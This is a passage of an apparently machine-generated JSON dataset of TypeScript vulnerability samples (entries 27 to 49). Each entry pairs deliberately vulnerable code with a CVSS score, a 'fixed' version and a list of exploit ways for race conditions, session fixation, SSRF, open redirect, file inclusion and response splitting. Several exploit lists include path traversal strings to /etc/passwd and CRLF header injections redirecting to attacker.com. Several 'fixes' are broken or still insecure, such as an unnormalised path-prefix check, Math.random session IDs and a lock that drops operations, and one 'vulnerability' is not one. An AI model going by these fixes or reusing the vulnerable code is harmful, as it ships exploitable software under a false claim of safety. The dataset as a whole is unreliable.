        "fixed_code": "\"use strict\";\nclass ResourceHandler {\n    private resource: number = 0;\n    private lock: boolean = false;\n\n    public increment(): void {\n        if (!this.lock) {\n            this.lock = true;\n            setTimeout(() => {\n                this.resource++;\n                this.lock = false;\n            }, Math.random() * 100);\n        }\n    }\n\n    public decrement(): void {\n        if (!this.lock) {\n            this.lock = true;\n            setTimeout(() => {\n                this.resource--;\n                this.lock = false;\n            }, Math.random() * 100);\n        }\n    }\n\n    public getResource(): number {\n        return this.resource;\n    }\n}",
        "exploit_ways": [
            "An attacker could manipulate timing to cause the resource counter to increment or decrement incorrectly.",
            "Race condition might lead to inconsistent states if multiple operations are performed rapidly in succession.",
            "In rare cases, it could allow a denial-of-service by continuously triggering conflicting increments and decrements."
        ]
    },
    "typescript_28": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "function unsafeRaceCondition() {\n    let flag = false;\n    setTimeout(() => { flag = true; }, 100);\n    while (!flag) {}\n}",
        "cvss_score": 5.3,
        "fixed_code": "function safeRaceCondition(callback) {\n    setTimeout(() => {\n        callback();\n    }, 100);\n}",
        "exploit_ways": [
            "An attacker could potentially exploit this in environments with predictable timing to interfere with execution flow.",
            "The race condition might allow unauthorized access or modification of shared resources under certain conditions.",
            "In a multi-threaded environment, an attacker could manipulate the timing to bypass security checks."
        ]
    },
    "typescript_29": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "function criticalOperation() {\n    let flag = false;\n    setTimeout(() => { flag = true; }, 100);\n    if (!flag) {\n        // Vulnerable code here\n        console.log(\"Operation completed\");\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "function criticalOperation() {\n    let flag = false;\n    const promise = new Promise((resolve) => {\n        setTimeout(() => { \n            flag = true; \n            resolve();\n        }, 100);\n    });\n    promise.then(() => {\n        // Secure code here\n        console.log(\"Operation completed\");\n    });\n}",
        "exploit_ways": [
            "An attacker could attempt to execute the vulnerable code before the flag is set, leading to unintended behavior.",
            "In a multi-threaded environment, simultaneous execution of criticalOperation might lead to race conditions affecting shared resources.",
            "By carefully timing function calls in a script or automated tool, an attacker might exploit the window where the flag is false."
        ]
    },
    "typescript_30": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "function setSessionId(req, res) {\n    const sessionId = req.query.sessionId;\n    res.cookie('sessionId', sessionId);\n}",
        "cvss_score": 4.2,
        "fixed_code": "function setSessionId(req, res) {\n    const crypto = require('crypto');\n    const sessionId = crypto.randomBytes(16).toString('hex');\n    res.cookie('sessionId', sessionId, { httpOnly: true, secure: true });\n}",
        "exploit_ways": [
            "An attacker can set a specific session ID in the query parameter to hijack an existing session.",
            "By fixing the session ID, the attacker can force users into sessions they control, potentially gaining unauthorized access.",
            "If the session ID is predictable, an attacker can guess and use it to impersonate a user."
        ]
    },
    "typescript_31": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "function redirectToUrl(url: string): void {\n    window.location.href = url;\n}",
        "cvss_score": 6.5,
        "fixed_code": "function redirectToUrl(url: string, allowedUrls: Array<string>): void {\n    if (allowedUrls.includes(url)) {\n        window.location.href = url;\n    } else {\n        console.error(\"Redirect to unauthorized URL attempted\");\n    }\n}",
        "exploit_ways": [
            "An attacker can redirect users to a malicious site by providing an external URL.",
            "They could use the redirect to install malware or perform phishing attacks on unsuspecting users.",
            "Attackers might also use open redirects to bypass CORS restrictions and access internal resources."
        ]
    },
    "typescript_32": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "class WebServer {\\n    private app;\\n\\n    constructor() {\\n        this.app = require('express')();\\n        this.setupRoutes();\\n    }\\n\\n    private setupRoutes(): void {\\n        this.app.get('/', (req, res) => {\\n            res.send('Hello World!');\\n        });\\n    }\\n\\n    public start(port: number): void {\\n        this.app.listen(port, () => {\\n            console.log(`Server running on port ${port}`);\\n        });\\n    }\\n}",
        "cvss_score": 5.4,
        "fixed_code": "class WebServer {\\n    private app;\\n\\n    constructor() {\\n        this.app = require('express')();\\n        const helmet = require('helmet');\\n        this.app.use(helmet());\\n        this.setupRoutes();\\n    }\\n\\n    private setupRoutes(): void {\\n        this.app.get('/', (req, res) => {\\n            res.send('Hello World!');\\n        });\\n    }\\n\\n    public start(port: number): void {\\n        this.app.listen(port, () => {\\n            console.log(`Server running on port ${port}`);\\n        });\\n    }\\n}",
        "exploit_ways": [
            "An attacker can perform Clickjacking attacks due to the absence of X-Frame-Options.",
            "Cross-Site Scripting (XSS) might be possible if user input is not sanitized, as Content Security Policy (CSP) headers are missing.",
            "The server is vulnerable to MIME type sniffing attacks since there are no X-Content-Type-Options headers set."
        ]
    },
    "typescript_33": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "function processRequests() {\n    while (true) {\n        let data = fetch('http://example.com/data').then(response => response.json());\n        console.log(data);\n    }\n}",
        "cvss_score": 4.3,
        "fixed_code": "function processRequests() {\n    setInterval(() => {\n        fetch('http://example.com/data')\n            .then(response => response.json())\n            .then(data => console.log(data))\n            .catch(error => console.error('Error fetching data:', error));\n    }, 5000); // Adjust interval as necessary\n}",
        "exploit_ways": [
            "An attacker can overwhelm the server by repeatedly making requests faster than it can handle, causing resource exhaustion.",
            "By introducing network latency or errors, an attacker can slow down or stop the processing of requests, leading to a denial-of-service condition.",
            "Exploiting a bug in the fetch implementation could cause infinite loops or crashes, preventing legitimate users from accessing services."
        ]
    },
    "typescript_34": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "function logSensitiveData(data: any) {\n    if (process.env.DEBUG_MODE === 'true') {\n        console.log(JSON.stringify(data));\n    }\n}",
        "cvss_score": 2.5,
        "fixed_code": "function logSensitiveData(data: any) {\n    const debugMode = process.env.DEBUG_MODE;\n    if (debugMode && debugMode.toLowerCase() === 'true') {\n        console.log(JSON.stringify({}));\n    }\n}",
        "exploit_ways": [
            "An attacker with access to the logs could see sensitive data when DEBUG_MODE is enabled.",
            "By setting DEBUG_MODE=true, they can expose user data or other confidential information in the application logs.",
            "Potential for leaking API keys, database credentials, or session tokens if logged inadvertently."
        ]
    },
    "typescript_35": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "<button id=\"hiddenButton\" style=\"opacity: 0; position: absolute;\"></button>\n<script lang=\"typescript\">\ndocument.getElementById(\"hiddenButton\").addEventListener(\"click\", () => {\n    alert('You were clickjacked!');\n});\n</script>",
        "cvss_score": 3.5,
        "fixed_code": "<button id=\"visibleButton\" style=\"position: relative;\">Click Me</button>\n<script lang=\"typescript\">\ndocument.getElementById(\"visibleButton\").addEventListener(\"click\", () => {\n    alert('You clicked the button!');\n});\n</script>",
        "exploit_ways": [
            "An attacker can overlay a transparent button over another important button to trick users into clicking it.",
            "Users might unknowingly trigger actions like sharing content or subscribing to services without their intention.",
            "Attackers could force users to perform unwanted actions on the website by manipulating their clicks through layered elements."
        ]
    },
    "typescript_36": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "import * as express from 'express';\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-cookie', (req, res) => {\n    const cookieValue = req.body.cookieValue;\n    res.setHeader('Set-Cookie', `user=${cookieValue}; Path=/; HttpOnly`);\n    res.send('Cookie set successfully!');\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on http://localhost:3000');\n});",
        "cvss_score": 6.1,
        "fixed_code": "import * as express from 'express';\nconst app = express();\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/set-cookie', (req, res) => {\n    const cookieValue = encodeURIComponent(req.body.cookieValue);\n    res.setHeader('Set-Cookie', `user=${cookieValue}; Path=/; HttpOnly`);\n    res.send('Cookie set successfully!');\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on http://localhost:3000');\n});",
        "exploit_ways": [
            "An attacker can inject CRLF sequences (\\r\\n) to split the response and set arbitrary headers.",
            "They could potentially use this to perform cache poisoning attacks on intermediate proxies.",
            "Injecting JavaScript code via the cookie value might lead to XSS if the cookie is echoed back in responses."
        ]
    },
    "typescript_37": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "import * as fs from 'fs';\nimport * as express from 'express';\n\nconst app = express();\napp.get('/file', (req, res) => {\n    const filePath = req.query.path;\n    fs.readFile(filePath, (err, data) => {\n        if (err) {\n            res.status(500).send('Error reading file');\n        } else {\n            res.send(data);\n        }\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on http://localhost:3000');\n});",
        "cvss_score": 5.3,
        "fixed_code": "import * as fs from 'fs';\nimport * as express from 'express';\nimport * as path from 'path';\n\nconst app = express();\napp.get('/file', (req, res) => {\n    const baseDirectory = path.join(__dirname, 'files');\n    const requestedPath = path.normalize(req.query.path || '');\n    const filePath = path.join(baseDirectory, requestedPath);\n\n    if (!filePath.startsWith(baseDirectory)) {\n        return res.status(403).send('Forbidden');\n    }\n\n    fs.readFile(filePath, (err, data) => {\n        if (err) {\n            res.status(500).send('Error reading file');\n        } else {\n            res.send(data);\n        }\n    });\n});\n\napp.listen(3000, () => {\n    console.log('Server is running on http://localhost:3000');\n});",
        "exploit_ways": [
            "An attacker can use path traversal to access files outside the intended directory, e.g., /file?path=../config.ini.",
            "They could request server logs or other sensitive configuration files by manipulating the 'path' parameter.",
            "By injecting specific file paths, attackers might retrieve critical data such as database credentials stored in local files."
        ]
    },
    "typescript_38": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "function setSessionCookie(req, res) {\n    const sessionId = req.query.sessionId;\n    res.cookie('sessionId', sessionId, { httpOnly: true });\n}",
        "cvss_score": 4.0,
        "fixed_code": "function setSessionCookie(req, res) {\n    const crypto = require('crypto');\n    const newSessionId = crypto.randomBytes(16).toString('hex');\n    res.cookie('sessionId', newSessionId, { httpOnly: true, secure: true });\n}",
        "exploit_ways": [
            "An attacker can set a session ID in the query parameter to hijack an existing user's session.",
            "By providing a known session ID, the attacker can predict or guess IDs used by other users.",
            "If combined with other vulnerabilities, the attacker can use this to escalate privileges."
        ]
    },
    "typescript_39": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "import { createServer } from 'http';\n\nconst server = createServer((req, res) => {\n    while (true) {}\n    res.end('This will never be reached');\n});\n\nserver.listen(3000, () => {\n    console.log('Server running on http://localhost:3000/');\n});",
        "cvss_score": 4.2,
        "fixed_code": "import { createServer } from 'http';\n\nconst server = createServer((req, res) => {\n    res.end('Request processed successfully');\n});\n\nserver.listen(3000, () => {\n    console.log('Server running on http://localhost:3000/');\n});",
        "exploit_ways": [
            "An attacker can send a single request to the server and cause it to hang indefinitely, making it unresponsive to other legitimate requests.",
            "By continuously sending requests, an attacker could exhaust the server's resources, leading to denial of service for all users.",
            "A malicious user might craft specific inputs or requests that trigger the infinite loop, targeting the server specifically."
        ]
    },
    "typescript_40": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "\"use strict\";\n\nfunction setHeaders(res) {\n    res.setHeader(\"Content-Type\", \"application/json\");\n    // Missing security headers like Content-Security-Policy, X-Frame-Options, etc.\n    return res;\n}",
        "cvss_score": 4.3,
        "fixed_code": "\"use strict\";\n\nfunction setHeaders(res) {\n    res.setHeader(\"Content-Type\", \"application/json\");\n    res.setHeader(\"Content-Security-Policy\", \"default-src 'self'\");\n    res.setHeader(\"X-Frame-Options\", \"SAMEORIGIN\");\n    res.setHeader(\"X-XSS-Protection\", \"1; mode=block\");\n    res.setHeader(\"X-Content-Type-Options\", \"nosniff\");\n    return res;\n}",
        "exploit_ways": [
            "An attacker could inject malicious scripts leading to Cross-Site Scripting (XSS).",
            "The application is vulnerable to Clickjacking due to the absence of X-Frame-Options.",
            "Data theft can occur if an attacker can manipulate content served from a different source."
        ]
    },
    "typescript_41": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "import { Router } from 'express';\nconst router = Router();\n\nrouter.get('/redirect', (req, res) => {\n    const url = req.query.url as string;\n    if (!url) {\n        return res.status(400).send('URL is required');\n    }\n    if (!isAllowedDomain(url)) {\n        return res.status(403).send('Forbidden domain');\n    }\n    res.redirect(url);\n});\n\nfunction isAllowedDomain(url: string): boolean {\n    const allowedDomains = ['example.com', 'test.com'];\n    try {\n        const parsedUrl = new URL(url);\n        return allowedDomains.includes(parsedUrl.hostname);\n    } catch (error) {\n        return false;\n    }\n}\n\nexport default router;",
        "cvss_score": 6.8,
        "fixed_code": "import { Router } from 'express';\nconst router = Router();\nconst safeRedirects = new Map([\n    ['example', 'https://example.com'],\n    ['test', 'https://test.com']\n]);\n\nrouter.get('/redirect', (req, res) => {\n    const key = req.query.url as string;\n    if (!key) {\n        return res.status(400).send('URL is required');\n    }\n    const safeUrl = safeRedirects.get(key);\n    if (!safeUrl) {\n        return res.status(403).send('Forbidden domain');\n    }\n    res.redirect(safeUrl);\n});\n\nexport default router;",
        "exploit_ways": [
            "An attacker can provide a URL to an external site that mimics the allowed domains, tricking users into visiting malicious content.",
            "Crafted URLs with encoded characters could bypass domain checks and redirect to unintended sites.",
            "Using URL parameters with relative paths (e.g., /../admin) might exploit path traversal vulnerabilities if not properly handled."
        ]
    },
    "typescript_42": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "import * as express from 'express';\n\nconst app = express();\napp.use(express.json());\n\nlet sessionStore = {};\n\napp.post('/login', (req, res) => {\n    const { username } = req.body;\n    if (!username) {\n        return res.status(400).send('Username is required');\n    }\n    let sessionId = req.cookies['session_id'] || Math.random().toString(36).substr(2, 9);\n    sessionStore[sessionId] = { username };\n    res.cookie('session_id', sessionId, { httpOnly: true });\n    res.send(`Logged in as ${username}`);\n});\n\napp.get('/profile', (req, res) => {\n    const sessionId = req.cookies['session_id'];\n    if (!sessionId || !sessionStore[sessionId]) {\n        return res.status(401).send('Unauthorized');\n    }\n    res.send(`Profile of ${sessionStore[sessionId].username}`);\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "cvss_score": 2.1,
        "fixed_code": "import * as express from 'express';\nimport * as crypto from 'crypto';\n\nconst app = express();\napp.use(express.json());\n\nlet sessionStore = {};\n\napp.post('/login', (req, res) => {\n    const { username } = req.body;\n    if (!username) {\n        return res.status(400).send('Username is required');\n    }\n    let sessionId = crypto.randomBytes(16).toString('hex');\n    sessionStore[sessionId] = { username };\n    res.cookie('session_id', sessionId, { httpOnly: true, secure: true, sameSite: 'strict' });\n    res.send(`Logged in as ${username}`);\n});\n\napp.get('/profile', (req, res) => {\n    const sessionId = req.cookies['session_id'];\n    if (!sessionId || !sessionStore[sessionId]) {\n        return res.status(401).send('Unauthorized');\n    }\n    res.send(`Profile of ${sessionStore[sessionId].username}`);\n});\n\napp.listen(3000, () => {\n    console.log('Server running on port 3000');\n});",
        "exploit_ways": [
            "An attacker can set a fixed session_id in their browser cookies and trick a user into logging in with that same session_id to hijack their session.",
            "Attackers could use the predictable session ID generation to guess valid session IDs, especially if they observe patterns or low entropy in the generated IDs.",
            "By maintaining a long-lived session, an attacker can attempt to use old session IDs that were not properly invalidated after logout."
        ]
    },
    "typescript_43": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "import * as http from 'http';\n\nconst server = http.createServer((req, res) => {\n    const urlParam = req.url?.split('=')[1];\n    if (urlParam) {\n        http.get(urlParam, (response) => {\n            let data = '';\n            response.on('data', (chunk) => { data += chunk; });\n            response.on('end', () => { res.end(data); });\n        }).on('error', (err) => { res.statusCode = 500; res.end(`Error: ${err.message}`); });\n    } else {\n        res.statusCode = 400;\n        res.end('Bad Request');\n    }\n});\n\nserver.listen(3000, () => {\n    console.log('Server running at http://localhost:3000/');\n});",
        "cvss_score": 7.5,
        "fixed_code": "import * as http from 'http';\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    const urlParam = req.url?.split('=')[1];\n    if (urlParam) {\n        const parsedUrl = new URL(urlParam);\n        if (!parsedUrl.hostname.endsWith('.example.com')) {\n            res.statusCode = 403;\n            return res.end('Forbidden');\n        }\n        http.get(urlParam, (response) => {\n            let data = '';\n            response.on('data', (chunk) => { data += chunk; });\n            response.on('end', () => { res.end(data); });\n        }).on('error', (err) => { res.statusCode = 500; res.end(`Error: ${err.message}`); });\n    } else {\n        res.statusCode = 400;\n        res.end('Bad Request');\n    }\n});\n\nserver.listen(3000, () => {\n    console.log('Server running at http://localhost:3000/');\n});",
        "exploit_ways": [
            "An attacker could request an internal IP address like http://127.0.0.1 to access local services.",
            "They can use a URL parameter to request data from other domains, potentially leaking sensitive information if those services are not secured.",
            "Crafting a URL with a malicious payload could be used to perform further attacks on the internal network."
        ]
    },
    "typescript_44": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "class HttpResponseHandler {\n    private response: string;\n\n    constructor(response: string) {\n        this.response = response;\n    }\n\n    public sendResponse(): void {\n        console.log(this.response);\n    }\n}",
        "cvss_score": 6.1,
        "fixed_code": "class HttpResponseHandler {\n    private response: string;\n\n    constructor(response: string) {\n        this.response = encodeURIComponent(response);\n    }\n\n    public sendResponse(): void {\n        console.log(this.response);\n    }\n}",
        "exploit_ways": [
            "An attacker could inject '\\r\\nSet-Cookie: malicious=true;' to manipulate HTTP headers.",
            "By inserting '\\r\\nLocation: http://attacker.com', an attacker can redirect users to a malicious site.",
            "Injecting '\\r\\nContent-Length: 0' followed by another response can cause response splitting leading to injection of additional data."
        ]
    },
    "typescript_45": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "class FileReader {\n    constructor(private filePath: string) {}\n\n    read() {\n        const fs = require('fs');\n        return fs.readFileSync(this.filePath, 'utf8');\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "class FileReader {\n    constructor(private filePath: string) {}\n\n    read() {\n        const fs = require('fs');\n        const path = require('path');\n        const rootDir = path.resolve(__dirname, 'safe_directory');\n        const resolvedPath = path.resolve(rootDir, this.filePath);\n        if (!resolvedPath.startsWith(rootDir)) {\n            throw new Error('Access denied');\n        }\n        return fs.readFileSync(resolvedPath, 'utf8');\n    }\n}",
        "exploit_ways": [
            "An attacker can input '../../etc/passwd' to read the system's password file.",
            "They might use '../config/database.ini' to access sensitive database configuration files.",
            "Crafting a path like '%2e%2e/%2e%2e/etc/hosts' could reveal network configurations."
        ]
    },
    "typescript_46": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "\"use strict\";\nclass User {\n    private _name: string;\n    constructor(name: string) {\n        this._name = name;\n    }\n    public getName(): string {\n        return this._name;\n    }\n}\nconst user = new User(\\\"Alice\\\");\nconsole.log(user.getName());\n// Vulnerability: The getName method exposes the private _name property, allowing information disclosure.",
        "cvss_score": 2.1,
        "fixed_code": "\"use strict\";\nclass User {\n    private _name: string;\n    constructor(name: string) {\n        this._name = name;\n    }\n    public getName(): string {\n        // Assuming a safe context to return the name, otherwise restrict access\n        if (this.isAuthorized()) {\n            return this._name;\n        } else {\n            throw new Error(\\\"Unauthorized access\\\");\n        }\n    }\n    private isAuthorized(): boolean {\n        // Implement authorization logic here\n        return true; // Placeholder for actual check\n    }\n}\nconst user = new User(\\\"Alice\\\");\nconsole.log(user.getName());",
        "exploit_ways": [
            "An attacker can call getName() to reveal the private _name property if unauthorized access is not properly checked.",
            "If this class is part of a larger application, an attacker might exploit this to gather user information for further attacks.",
            "In a web context, this could lead to leaking usernames in response headers or logs if not handled correctly."
        ]
    },
    "typescript_47": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "class FileReader {\n    filePath: string;\n\n    constructor(path: string) {\n        this.filePath = path;\n    }\n\n    readFile() {\n        const fs = require('fs');\n        return fs.readFileSync(this.filePath, 'utf8');\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "class FileReader {\n    filePath: string;\n\n    constructor(path: string) {\n        this.filePath = path;\n    }\n\n    readFile() {\n        const fs = require('fs');\n        const baseDir = __dirname + '/safe_directory/';\n        if (!this.filePath.startsWith(baseDir)) {\n            throw new Error('Invalid file path');\n        }\n        return fs.readFileSync(this.filePath, 'utf8');\n    }\n}",
        "exploit_ways": [
            "An attacker can input a malicious path like '/etc/passwd' to read sensitive system files.",
            "Could use '../..' traversal techniques to access files outside the intended directory.",
            "By providing a crafted file path, an attacker may attempt to include and execute server-side scripts."
        ]
    },
    "typescript_48": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "class AuthService {\n    setSessionId(userId: string) {\n        document.cookie = `sessionId=${userId}; path=/`;\n    }\n}",
        "cvss_score": 4.2,
        "fixed_code": "class AuthService {\n    setSessionId(userId: string) {\n        const sessionId = Math.random().toString(36).substr(2, 16);\n        document.cookie = `sessionId=${sessionId}; HttpOnly; Secure; path=/`;\n        // Store the sessionId with userId in server-side session store\n    }\n}",
        "exploit_ways": [
            "An attacker can predict or guess the session ID to hijack a user's session.",
            "By setting a fixed session ID, an attacker could force users to adopt it if they log in again.",
            "This vulnerability allows attackers to maintain persistent sessions without needing credentials."
        ]
    },
    "typescript_49": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "\"use strict\";\nclass DataFetcher {\n    private baseUrl: string;\n\n    constructor(url: string) {\n        this.baseUrl = url;\n    }\n\n    public async fetchData(endpoint: string): Promise<any> {\n        const fullUrl = new URL(endpoint, this.baseUrl).href;\n        const response = await fetch(fullUrl);\n        return response.json();\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "\"use strict\";\nclass DataFetcher {\n    private baseUrl: string;\n\n    constructor(url: string) {\n        this.baseUrl = new URL(url).origin;\n    }\n\n    public async fetchData(endpoint: string): Promise<any> {\n        const fullUrl = new URL(endpoint, this.baseUrl);\n        if (fullUrl.origin !== this.baseUrl) {\n            throw new Error('Invalid endpoint');\n        }\n        const response = await fetch(fullUrl);\n        return response.json();\n    }\n}",
        "exploit_ways": [
            "An attacker could provide a malicious endpoint that points to an internal server, e.g., \"/../internal/config\"",
            "By using relative paths or URL fragments, the attacker might access unintended resources on the same origin",
            "Crafting specially crafted URLs could lead to information leakage from other services accessible by the server"
        ]
    }
}